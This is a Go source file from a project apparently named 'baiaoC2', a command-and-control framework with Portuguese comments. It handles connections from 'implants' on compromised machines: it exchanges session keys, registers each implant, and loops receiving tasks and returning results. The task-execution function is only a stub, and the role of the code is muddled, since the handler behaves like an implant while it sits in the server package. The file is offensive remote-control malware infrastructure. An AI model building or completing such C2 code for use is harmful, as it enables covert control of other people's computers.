package handlers

import (
	"log"
	"net"
	"baiaoC2/shared/crypto"
	"baiaoC2/shared/protocol"
)

// HandleImplant gerencia a comunicação com os implantes
func HandleImplant(conn net.Conn, key string) {
	defer conn.Close()

	// Gerar chave de sessão
	sessionKey := crypto.GenerateSessionKey()
	err := protocol.SendSessionKey(conn, sessionKey, key)
	if err != nil {
		log.Printf("Erro ao enviar chave de sessão: %v", err)
		return
	}

	// Registrar implante
	implant := protocol.RegisterImplant(conn, sessionKey)
	log.Printf("[+] Novo implante registrado: %s\n", implant.ID)

	// Loop para processar tarefas recebidas
	for {
		task, err := protocol.ReceiveTask(conn, sessionKey)
		if err != nil {
			log.Printf("Erro ao receber tarefa: %v", err)
			return
		}

		// Executar a tarefa recebida
		result := ExecuteTask(task)

		// Enviar o resultado da tarefa de volta ao servidor
		err = protocol.SendTaskResult(conn, result, sessionKey)
		if err != nil {
			log.Printf("Erro ao enviar resultado da tarefa: %v", err)
			return
		}
	}
}

// ExecuteTask executa a tarefa recebida do C2
func ExecuteTask(task protocol.Task) protocol.TaskResult {
	// Implementar a execução de comandos enviados pelo servidor
	return protocol.TaskResult{Success: true, Output: "Tarefa executada com sucesso"}
}
